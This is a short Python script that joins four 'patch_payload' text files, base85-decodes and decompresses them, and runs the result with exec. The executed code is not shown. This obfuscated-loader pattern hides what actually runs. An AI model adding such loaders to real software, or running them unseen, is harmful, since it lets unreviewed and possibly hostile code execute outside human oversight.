import base64, zlib
from pathlib import Path

base = Path(__file__).resolve().parent
payload = "".join((base / f"patch_payload_{index}.txt").read_text(encoding="utf-8") for index in range(4))
exec(compile(zlib.decompress(base64.b85decode(payload)), __file__, "exec"))
